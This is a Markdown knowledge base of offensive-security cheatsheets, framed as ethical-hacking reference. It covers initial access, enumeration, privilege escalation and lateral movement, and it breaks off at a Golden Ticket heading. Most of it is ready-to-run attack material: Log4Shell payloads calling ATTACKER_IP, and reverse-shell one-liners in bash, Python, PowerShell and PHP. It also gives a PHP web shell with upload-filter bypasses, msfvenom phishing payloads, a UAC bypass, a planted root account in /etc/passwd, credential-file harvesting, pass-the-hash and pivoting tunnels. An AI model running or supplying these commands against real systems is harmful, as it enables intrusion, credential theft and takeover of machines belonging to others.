# Base de Conocimiento — Hacking & Pentesting

> Base de conocimiento para consultas sobre hacking ético, pentesting y ciberseguridad.
> Fuente: Ilias1988/Hacking-Cheatsheets (MIT License)

## 🔴 Attack Methodology — # 🚪 Phase 1: Initial Access

```
  ██╗███╗   ██╗██╗████████╗██╗ █████╗ ██╗          █████╗  ██████╗ ██████╗███████╗███████╗███████╗
  ██║████╗  ██║██║╚══██╔══╝██║██╔══██╗██║         ██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝
  ██║██╔██╗ ██║██║   ██║   ██║███████║██║         ███████║██║     ██║     █████╗  ███████╗███████╗
  ██║██║╚██╗██║██║   ██║   ██║██╔══██║██║         ██╔══██║██║     ██║     ██╔══╝  ╚════██║╚════██║
  ██║██║ ╚████║██║   ██║   ██║██║  ██║███████╗    ██║  ██║╚██████╗╚██████╗███████╗███████║███████║
  ╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝
```

**Goal:** Gain first foothold into the target network or system.

---

## 🔴 Attack Methodology — 🎯 Attack Vectors

| Vector | Description |
|--------|-------------|
| **Exploit Public-Facing App** | Web apps, APIs, CMS vulnerabilities |
| **Phishing** | Malicious emails with payloads |
| **Valid Credentials** | Password spraying, credential stuffing |
| **External Services** | RDP, SSH, VPN, FTP exposed |
| **Supply Chain** | Compromise trusted software |

---

## 🔴 Attack Methodology — 💻 Exploiting Known Vulnerabilities

### Search for Exploits
```bash
# SearchSploit - Local exploit database
searchsploit apache 2.4
searchsploit -m 41234  # Copy exploit to current dir
searchsploit --nmap scan.xml  # Parse Nmap results

# Metasploit search
msfconsole -q -x "search type:exploit apache"
```

### Common Exploits

#### EternalBlue (MS17-010) - Windows SMB
```bash
# Check if vulnerable
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.10

# Exploit with Metasploit
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set LHOST 10.10.10.10
run
```

#### Log4Shell (CVE-2021-44228)
```bash
# Test for vulnerability
curl -H 'X-Api-Version: ${jndi:ldap://ATTACKER_IP:1389/a}' http://target.com

# Setup exploit server
java -jar JNDI-Exploit.jar -C "bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}" -A ATTACKER_IP
```

#### ProxyShell/ProxyLogon - Exchange
```bash
# Scan for ProxyShell
nmap -p 443 --script http-vuln-exchange-proxyshell 192.168.1.10

# Use exploit
python3 proxyshell_exploit.py -t https://exchange.target.com -e attacker@evil.com
```

---

## 🔴 Attack Methodology — 🌐 Web Application Attacks

### SQL Injection (Get Shell)
```bash
# Test for SQLi
sqlmap -u "http://target.com/page?id=1" --batch

# Get OS shell via SQLi
sqlmap -u "http://target.com/page?id=1" --os-shell

# Get SQL shell
sqlmap -u "http://target.com/page?id=1" --sql-shell
```

### File Upload to Shell
```bash
# Create PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php

# Or simple PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Bypass extension filters
shell.php.jpg
shell.pHp
shell.php%00.jpg
shell.php;.jpg
```

### Remote Code Execution (RCE)
```bash
# Test for RCE
curl "http://target.com/cmd.php?cmd=id"
curl "http://target.com/cmd.php?cmd=whoami"

# Reverse shell via RCE
curl "http://target.com/cmd.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.10.10/4444%200>%261'"
```

---

## 🔴 Attack Methodology — 🔐 Credential Attacks

### Password Spraying
```bash
# CrackMapExec - SMB
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Spring2024!' --continue-on-success

# CrackMapExec - WinRM
crackmapexec winrm 192.168.1.0/24 -u users.txt -p passwords.txt

# Hydra - SSH
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# Hydra - RDP
hydra -L users.txt -P passwords.txt rdp://192.168.1.10
```

### Credential Stuffing
```bash
# Using known leaked credentials
hydra -C creds.txt ftp://192.168.1.10

# Format for creds.txt:
# username:password
```

### Default Credentials
```bash
# Common defaults to try:
admin:admin
admin:password
root:root
root:toor
administrator:password

# CrackMapExec with common creds
crackmapexec smb 192.168.1.10 -u admin -p 'admin'
```

---

## 🔴 Attack Methodology — 📧 Phishing Payloads

### Office Macro Payload
```bash
# Generate macro payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f vba -o macro.vba

# Or use msfconsole
use exploit/multi/fileformat/office_word_macro
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
run
```

### HTA Payload
```bash
# Generate HTA file
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh -o evil.hta

# Host it
python3 -m http.server 80
```

### LNK Payload
```powershell
# Create malicious shortcut
$obj = New-Object -ComObject WScript.Shell
$link = $obj.CreateShortcut("C:\Users\Public\Resume.lnk")
$link.TargetPath = "cmd.exe"
$link.Arguments = "/c powershell -ep bypass -w hidden -c IEX(payload)"
$link.IconLocation = "C:\Windows\System32\notepad.exe"
$link.Save()
```

---

## 🔴 Attack Methodology — 🖥️ External Service Exploitation

### RDP Exploitation
```bash
# Brute force RDP
hydra -L users.txt -P passwords.txt rdp://192.168.1.10

# BlueKeep (CVE-2019-0708)
msfconsole -q
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.10
run
```

### SSH Exploitation
```bash
# Brute force SSH
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# SSH with known credentials
ssh user@192.168.1.10

# SSH with private key
ssh -i id_rsa user@192.168.1.10
```

### FTP Exploitation
```bash
# Anonymous login
ftp 192.168.1.10
# Username: anonymous
# Password: anonymous

# Brute force
hydra -L users.txt -P passwords.txt ftp://192.168.1.10

# ProFTPd exploit
msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS 192.168.1.10; run"
```

---

## 🔴 Attack Methodology — 🎧 Setting Up Listeners

### Netcat Listener
```bash
nc -lvnp 4444
```

### Metasploit Handler
```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
run
```

### Powercat (PowerShell)
```powershell
# On attacker
powercat -l -p 4444

# On victim
powercat -c 10.10.10.10 -p 4444 -e cmd.exe
```

---

## 🔴 Attack Methodology — 📊 Quick Reference

### Reverse Shell One-Liners

| OS | Command |
|----|---------|
| **Bash** | `bash -i >& /dev/tcp/10.10.10.10/4444 0>&1` |
| **Python** | `python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'` |
| **PowerShell** | `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.10.10',4444);$s=$c.GetStream();[byte[]]$b=0..65535\|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1\|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"` |
| **PHP** | `php -r '$s=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'` |

---

## 🔴 Attack Methodology — 🔗 Related Cheatsheets

- [Metasploit](../Metasploit/README.md)
- [SQLMap](../SQLMap/README.md)
- [Hydra](../Hydra/README.md)
- [Web Vulnerabilities](../SSRF/README.md)

---

**Next Phase:** [02 - Enumeration/Discovery →](./02-Enumeration.md)

## 🔴 Attack Methodology — # 🔍 Phase 2: Discovery / Enumeration

```
  ███████╗███╗   ██╗██╗   ██╗███╗   ███╗███████╗██████╗  █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
  ██╔════╝████╗  ██║██║   ██║████╗ ████║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
  █████╗  ██╔██╗ ██║██║   ██║██╔████╔██║█████╗  ██████╔╝███████║   ██║   ██║██║   ██║██╔██╗ ██║
  ██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║██╔══╝  ██╔══██╗██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
  ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║███████╗██║  ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

**Goal:** Gather information about the compromised system and network to plan next steps.

---

## 🔴 Attack Methodology — 🖥️ Windows Enumeration

### System Information
```cmd
# Basic system info
systeminfo
hostname
whoami /all

# OS version
wmic os get caption,version,buildnumber

# Architecture
echo %PROCESSOR_ARCHITECTURE%

# Environment variables
set
```

### User & Group Enumeration
```cmd
# Current user privileges
whoami /priv
whoami /groups

# All local users
net user
net user administrator

# All local groups
net localgroup
net localgroup Administrators

# Domain users (if domain joined)
net user /domain
net group /domain
net group "Domain Admins" /domain
```

### Network Information
```cmd
# IP configuration
ipconfig /all

# Routing table
route print

# ARP table
arp -a

# Active connections
netstat -ano
netstat -ano | findstr ESTABLISHED
netstat -ano | findstr LISTENING

# DNS cache
ipconfig /displaydns

# Shares
net share
net view \\localhost
```

### Process & Services
```cmd
# Running processes
tasklist
tasklist /SVC
wmic process list brief

# Services
sc query
net start
wmic service list brief

# Scheduled tasks
schtasks /query /fo LIST /v
```

### Installed Software
```cmd
# Installed programs
wmic product get name,version
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall

# Hotfixes/Patches
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Credentials & Sensitive Files
```cmd
# Saved credentials
cmdkey /list

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

# Search for passwords in files
findstr /si password *.txt *.ini *.config *.xml
dir /s *pass* *cred* *vnc* *.config

# Unattend files
dir /s C:\*unattend.xml
dir /s C:\*sysprep.inf
```

---

## 🔴 Attack Methodology — 🐧 Linux Enumeration

### System Information
```bash
# Basic info
hostname
uname -a
cat /etc/os-release
cat /proc/version

# Architecture
arch

# Kernel version
uname -r
```

### User & Group Enumeration
```bash
# Current user
whoami
id
groups

# All users
cat /etc/passwd
cat /etc/shadow  # if readable
cat /etc/group

# Logged in users
w
who
last

# Sudo permissions
sudo -l
cat /etc/sudoers
```

### Network Information
```bash
# IP configuration
ip a
ifconfig

# Routing
ip route
route -n

# ARP
arp -a
ip neigh

# Active connections
ss -tulnp
netstat -tulnp

# DNS
cat /etc/resolv.conf
```

### Process & Services
```bash
# Running processes
ps aux
ps auxwww
top

# Services
systemctl list-units --type=service
service --status-all

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
```

### Installed Software
```bash
# Debian/Ubuntu
dpkg -l
apt list --installed

# RHEL/CentOS
rpm -qa
yum list installed

# SUID binaries (privesc vectors!)
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

### Credentials & Sensitive Files
```bash
# SSH keys
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# History files
cat ~/.bash_history
cat ~/.zsh_history

# Config files with passwords
grep -r "password" /etc/ 2>/dev/null
grep -r "pass" /home/ 2>/dev/null

# Interesting files
cat /etc/fstab
cat ~/.bashrc
cat ~/.profile
```

---

## 🔴 Attack Methodology — 🏢 Active Directory Enumeration

### PowerView
```powershell
# Import module
Import-Module .\PowerView.ps1

# Get domain info
Get-Domain
Get-DomainController

# Get users
Get-DomainUser
Get-DomainUser -Identity admin
Get-DomainUser | select samaccountname,description

# Get groups
Get-DomainGroup
Get-DomainGroupMember -Identity "Domain Admins"

# Get computers
Get-DomainComputer
Get-DomainComputer | select dnshostname,operatingsystem

# Get GPOs
Get-DomainGPO
Get-DomainGPOLocalGroup
```

### BloodHound
```bash
# Collect data with SharpHound
.\SharpHound.exe -c All

# Or with PowerShell
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# Python collector (from Linux)
bloodhound-python -u user -p 'password' -d domain.local -ns 192.168.1.1 -c All
```

### LDAP Enumeration
```bash
# From Linux with ldapsearch
ldapsearch -x -H ldap://192.168.1.1 -b "DC=domain,DC=local"

# Users
ldapsearch -x -H ldap://192.168.1.1 -b "DC=domain,DC=local" "(objectClass=user)"

# With credentials
ldapsearch -x -H ldap://192.168.1.1 -D "user@domain.local" -w 'password' -b "DC=domain,DC=local"
```

### Kerberos Enumeration
```bash
# Enumerate users with Kerbrute
kerbrute userenum -d domain.local users.txt --dc 192.168.1.1

# AS-REP Roastable users
GetNPUsers.py domain.local/ -no-pass -usersfile users.txt

# Kerberoastable accounts
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.1
```

---

## 🔴 Attack Methodology — 📡 Network Enumeration

### Host Discovery
```bash
# Ping sweep
nmap -sn 192.168.1.0/24

# ARP scan (local network)
arp-scan -l

# Netdiscover
netdiscover -r 192.168.1.0/24
```

### Port Scanning
```bash
# Quick scan
nmap -F 192.168.1.10

# Full port scan
nmap -p- 192.168.1.10

# Service version detection
nmap -sV -sC 192.168.1.10

# UDP scan
nmap -sU --top-ports 100 192.168.1.10
```

### SMB Enumeration
```bash
# Enum4linux
enum4linux -a 192.168.1.10

# SMB shares
smbclient -L //192.168.1.10 -N
smbmap -H 192.168.1.10
crackmapexec smb 192.168.1.10 --shares

# With credentials
smbclient //192.168.1.10/share -U user
```

### SNMP Enumeration
```bash
# Default community strings
snmpwalk -v2c -c public 192.168.1.10
snmpwalk -v2c -c private 192.168.1.10

# Enumerate with onesixtyone
onesixtyone -c community.txt 192.168.1.10
```

---

## 🔴 Attack Methodology — 🛠️ Automated Enumeration Tools

### Windows
```bash
# WinPEAS
.\winPEAS.exe

# Seatbelt
.\Seatbelt.exe -group=all

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Windows-Exploit-Suggester
python windows-exploit-suggester.py --database 2024.xlsx --systeminfo systeminfo.txt
```

### Linux
```bash
# LinPEAS
./linpeas.sh

# LinEnum
./LinEnum.sh

# Linux-exploit-suggester
./linux-exploit-suggester.sh

# LSE (Linux Smart Enumeration)
./lse.sh -l 2
```

---

## 🔴 Attack Methodology — 📊 Quick Reference

### Windows Quick Enum
```cmd
systeminfo
whoami /all
net user
net localgroup Administrators
ipconfig /all
netstat -ano
tasklist /SVC
```

### Linux Quick Enum
```bash
uname -a && id && sudo -l
cat /etc/passwd
ps aux
netstat -tulnp
find / -perm -4000 2>/dev/null
```

---

## 🔴 Attack Methodology — 🔗 Related Cheatsheets

- [Nmap](../Nmap/README.md)
- [BloodHound](../BloodHound/README.md)
- [PowerView](../PowerView/README.md)
- [CrackMapExec](../CrackMapExec/README.md)

---

**Previous Phase:** [← 01 - Initial Access](./01-Initial-Access.md)

**Next Phase:** [03 - Privilege Escalation →](./03-Privilege-Escalation.md)

## 🔴 Attack Methodology — # ⬆️ Phase 3: Privilege Escalation

```
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

**Goal:** Elevate privileges from standard user to Administrator/SYSTEM (Windows) or root (Linux).

> 📚 **Full Guides:** [Windows PrivEsc](../Windows-PrivEsc/README.md) | [Linux PrivEsc](../Linux-PrivEsc/README.md)

---

## 🔴 Attack Methodology — 🖥️ Windows Privilege Escalation

### Quick Wins - Check First
```cmd
# Check current privileges
whoami /priv
whoami /groups

# Check for stored credentials
cmdkey /list

# Unattended install files
dir /s C:\*unattend.xml C:\*sysprep.inf C:\*sysprep.xml 2>nul

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Service Exploits

#### Unquoted Service Path
```cmd
# Find unquoted paths
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

# If found: C:\Program Files\Some Service\service.exe
# Place malicious exe at: C:\Program.exe or C:\Program Files\Some.exe
```

#### Weak Service Permissions
```cmd
# Check service permissions with accesschk
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula

# If SERVICE_CHANGE_CONFIG:
sc config VulnService binpath="C:\temp\shell.exe"
sc stop VulnService
sc start VulnService
```

#### DLL Hijacking
```powershell
# Find services with missing DLLs (use Process Monitor)
# Place malicious DLL in service directory
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evil.dll
```

### Token Impersonation

#### SeImpersonatePrivilege (Potato Attacks)
```cmd
# Check if you have SeImpersonatePrivilege
whoami /priv

# PrintSpoofer (Windows 10/Server 2016-2019)
.\PrintSpoofer.exe -i -c cmd

# GodPotato (Windows 2012-2022)
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "C:\temp\shell.exe"

# JuicyPotato (Windows 7/Server 2008-2016)
.\JuicyPotato.exe -l 1337 -p C:\temp\shell.exe -t * -c {CLSID}
```

#### SeBackupPrivilege
```powershell
# Backup SAM and SYSTEM
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM

# Extract hashes on attacker machine
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### Registry Exploits
```cmd
# AutoRun
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Scheduled tasks writable paths
schtasks /query /fo LIST /v | findstr /i "Task To Run"

# Registry permissions
accesschk.exe -kvw hklm\SOFTWARE
```

### UAC Bypass
```powershell
# Fodhelper bypass (Windows 10)
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\temp\shell.exe"
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

### Automated Tools
```bash
# WinPEAS
.\winPEAS.exe

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

# Windows-Exploit-Suggester
python windows-exploit-suggester.py --systeminfo systeminfo.txt --database 2024.xlsx
```

---

## 🔴 Attack Methodology — 🐧 Linux Privilege Escalation

### Quick Wins - Check First
```bash
# Sudo permissions
sudo -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Writable /etc/passwd
ls -la /etc/passwd

# Kernel version for exploits
uname -a
```

### Sudo Exploits

#### Sudo without password
```bash
# If sudo -l shows: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c '!sh'

# If sudo -l shows: (ALL) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit

# If sudo -l shows: (ALL) NOPASSWD: /usr/bin/python
sudo python -c 'import os; os.system("/bin/sh")'
```

#### Sudo version exploit (CVE-2021-3156)
```bash
# Check sudo version
sudo --version

# If sudo < 1.9.5p2
# Use exploit: https://github.com/blasty/CVE-2021-3156
```

### SUID/SGID Binaries
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check GTFOBins for exploitation
# https://gtfobins.github.io/

# Example: SUID on /usr/bin/find
/usr/bin/find . -exec /bin/sh -p \; -quit

# Example: SUID on /usr/bin/vim
/usr/bin/vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# Example: SUID on /usr/bin/python
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### Capabilities
```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Example: cap_setuid on python
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Cron Jobs
```bash
# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Look for writable scripts
# Wildcard injection in tar:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /path/shell.sh
touch "/path/--checkpoint=1"
touch "/path/--checkpoint-action=exec=sh shell.sh"
```

### PATH Hijacking
```bash
# If a cron/script calls a binary without full path
# Create malicious binary in writable PATH directory

echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
```

### Writable /etc/passwd
```bash
# If /etc/passwd is writable
# Generate password hash
openssl passwd -1 -salt evil password123

# Add root user
echo 'evil:$1$evil$xyz...:0:0::/root:/bin/bash' >> /etc/passwd

# Switch to new root user
su evil
```

### Kernel Exploits
```bash
# Check kernel version
uname -r
cat /proc/version

# Search for exploits
searchsploit linux kernel 4.4 privilege escalation

# Popular kernel exploits:
# - DirtyCow (CVE-2016-5195) - Kernel 2.x - 4.x
# - DirtyPipe (CVE-2022-0847) - Kernel 5.8 - 5.16.11
```

### NFS Exploits
```bash
# Check for no_root_squash
showmount -e 192.168.1.10
cat /etc/exports

# If no_root_squash:
# Mount share, create SUID binary as root
mount -t nfs 192.168.1.10:/share /mnt
cp /bin/bash /mnt/bash
chmod +s /mnt/bash

# On target:
/mnt/bash -p
```

### Automated Tools
```bash
# LinPEAS
./linpeas.sh

# LinEnum
./LinEnum.sh

# Linux-exploit-suggester
./linux-exploit-suggester.sh

# Linux Smart Enumeration (LSE)
./lse.sh -l 2
```

---

## 🔴 Attack Methodology — 📊 Quick Reference

### Windows Checklist
```markdown
- [ ] whoami /priv (SeImpersonate, SeBackup, etc.)
- [ ] Unquoted service paths
- [ ] Weak service permissions
- [ ] AlwaysInstallElevated
- [ ] Stored credentials (cmdkey /list)
- [ ] Unattend/Sysprep files
- [ ] Scheduled tasks
- [ ] Run WinPEAS/PowerUp
```

### Linux Checklist
```markdown
- [ ] sudo -l
- [ ] SUID binaries (check GTFOBins)
- [ ] Capabilities
- [ ] Cron jobs (writable scripts, wildcards)
- [ ] /etc/passwd writable
- [ ] Kernel version (exploits)
- [ ] NFS no_root_squash
- [ ] Run LinPEAS
```

---

## 🔴 Attack Methodology — 🔗 Related Cheatsheets

- [Windows PrivEsc (Full)](../Windows-PrivEsc/README.md)
- [Linux PrivEsc (Full)](../Linux-PrivEsc/README.md)
- [Mimikatz](../Mimikatz/README.md)

---

**Previous Phase:** [← 02 - Enumeration](./02-Enumeration.md)

**Next Phase:** [04 - Lateral Movement →](./04-Lateral-Movement.md)

## 🔴 Attack Methodology — # ➡️ Phase 4: Lateral Movement

```
  ██╗      █████╗ ████████╗███████╗██████╗  █████╗ ██╗     
  ██║     ██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██║     
  ██║     ███████║   ██║   █████╗  ██████╔╝███████║██║     
  ██║     ██╔══██║   ██║   ██╔══╝  ██╔══██╗██╔══██║██║     
  ███████╗██║  ██║   ██║   ███████╗██║  ██║██║  ██║███████╗
  ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
        ███╗   ███╗ ██████╗ ██╗   ██╗███████╗███╗   ███╗███████╗███╗   ██╗████████╗
        ████╗ ████║██╔═══██╗██║   ██║██╔════╝████╗ ████║██╔════╝████╗  ██║╚══██╔══╝
        ██╔████╔██║██║   ██║██║   ██║█████╗  ██╔████╔██║█████╗  ██╔██╗ ██║   ██║   
        ██║╚██╔╝██║██║   ██║╚██╗ ██╔╝██╔══╝  ██║╚██╔╝██║██╔══╝  ██║╚██╗██║   ██║   
        ██║ ╚═╝ ██║╚██████╔╝ ╚████╔╝ ███████╗██║ ╚═╝ ██║███████╗██║ ╚████║   ██║   
        ╚═╝     ╚═╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   
```

**Goal:** Move from compromised system to other systems in the network.

---

## 🔴 Attack Methodology — 🔑 Credential-Based Movement

### Pass-the-Hash (PTH)
```bash
# Impacket PSExec with hash
impacket-psexec -hashes :NTLM_HASH administrator@192.168.1.10

# Impacket WMIExec
impacket-wmiexec -hashes :NTLM_HASH administrator@192.168.1.10

# Impacket SMBExec
impacket-smbexec -hashes :NTLM_HASH administrator@192.168.1.10

# CrackMapExec
crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH
crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH -x "whoami"

# Evil-WinRM
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH
```

### Pass-the-Ticket (PTT)
```powershell
# Export ticket from memory (Mimikatz)
sekurlsa::tickets /export

# Import ticket
kerberos::ptt ticket.kirbi

# Or with Rubeus
.\Rubeus.exe ptt /ticket:BASE64_TICKET

# Verify ticket
klist
```

### Overpass-the-Hash (Pass-the-Key)
```powershell
# Mimikatz - Request TGT with NTLM hash
sekurlsa::pth /user:administrator /domain:domain.local /ntlm:HASH /run:cmd

# Rubeus
.\Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /ptt
```

### Pass-the-Certificate
```bash
# Use certificate for authentication
certipy auth -pfx admin.pfx -dc-ip 192.168.1.1

# With Rubeus
.\Rubeus.exe asktgt /user:admin /certificate:admin.pfx /ptt
```

---

## 🔴 Attack Methodology — 🖥️ Remote Execution Methods

### PSExec
```bash
# Impacket PSExec
impacket-psexec domain/administrator:password@192.168.1.10
impacket-psexec -hashes :HASH administrator@192.168.1.10

# Metasploit PSExec
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.10
set SMBUser administrator
set SMBPass password
run
```

### WMIExec
```bash
# Impacket WMIExec (more stealthy)
impacket-wmiexec domain/administrator:password@192.168.1.10
impacket-wmiexec -hashes :HASH administrator@192.168.1.10

# PowerShell WMI
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami > C:\temp\out.txt" -ComputerName 192.168.1.10 -Credential $cred
```

### WinRM / Evil-WinRM
```bash
# Evil-WinRM with password
evil-winrm -i 192.168.1.10 -u administrator -p 'password'

# Evil-WinRM with hash
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH

# PowerShell remoting
Enter-PSSession -ComputerName 192.168.1.10 -Credential $cred
Invoke-Command -ComputerName 192.168.1.10 -Credential $cred -ScriptBlock { whoami }
```

### DCOM
```bash
# Impacket DCOM
impacket-dcomexec domain/administrator:password@192.168.1.10

# PowerShell DCOM
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.1.10"))
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

### SMB
```bash
# CrackMapExec command execution
crackmapexec smb 192.168.1.10 -u admin -p password -x "whoami"
crackmapexec smb 192.168.1.10 -u admin -p password -X "Get-Process"  # PowerShell

# File copy over SMB
smbclient //192.168.1.10/C$ -U administrator
put shell.exe

# PsExec style
crackmapexec smb 192.168.1.10 -u admin -p password --exec-method smbexec -x "whoami"
```

### RDP
```bash
# xfreerdp
xfreerdp /v:192.168.1.10 /u:administrator /p:password /dynamic-resolution

# With NTLM hash (restricted admin mode)
xfreerdp /v:192.168.1.10 /u:administrator /pth:NTLM_HASH

# Enable RDP remotely
crackmapexec smb 192.168.1.10 -u admin -p password -M rdp -o ACTION=enable
```

### SSH (Linux)
```bash
# SSH with password
ssh user@192.168.1.10

# SSH with key
ssh -i id_rsa user@192.168.1.10

# SSH tunneling/pivoting
ssh -D 9050 user@192.168.1.10  # SOCKS proxy
ssh -L 8080:internal:80 user@192.168.1.10  # Local port forward
```

---

## 🔴 Attack Methodology — 🔄 Network Pivoting

### SSH Tunneling
```bash
# Local port forward (access internal:80 via localhost:8080)
ssh -L 8080:192.168.2.10:80 user@192.168.1.10

# Dynamic SOCKS proxy
ssh -D 9050 user@192.168.1.10
proxychains nmap 192.168.2.0/24

# Remote port forward
ssh -R 4444:localhost:4444 user@192.168.1.10
```

### Chisel
```bash
# On attacker (server)
./chisel server --reverse --port 8080

# On victim (client)
./chisel client ATTACKER_IP:8080 R:socks

# Use with proxychains
proxychains nmap 192.168.2.10
```

### Ligolo-ng
```bash
# On attacker
./proxy -selfcert

# On victim
./agent -connect ATTACKER_IP:11601 -ignore-cert

# In proxy console
session
start
```

### Metasploit Pivoting
```bash
# Add route through meterpreter session
run autoroute -s 192.168.2.0/24

# Or manually
route add 192.168.2.0 255.255.255.0 1

# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 9050
run -j
```

---

## 🔴 Attack Methodology — 🎫 Kerberos Attacks

### Kerberoasting
```bash
# Get service tickets
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.1 -request

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Crack with hashcat
hashcat -m 13100 hashes.txt wordlist.txt
```

### AS-REP Roasting
```bash
# Find users without preauth
GetNPUsers.py domain.local/ -no-pass -usersfile users.txt -dc-ip 192.168.1.1

# Crack
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

### Golden Ticket
```powershell
# Get krbtgt hash first, then:
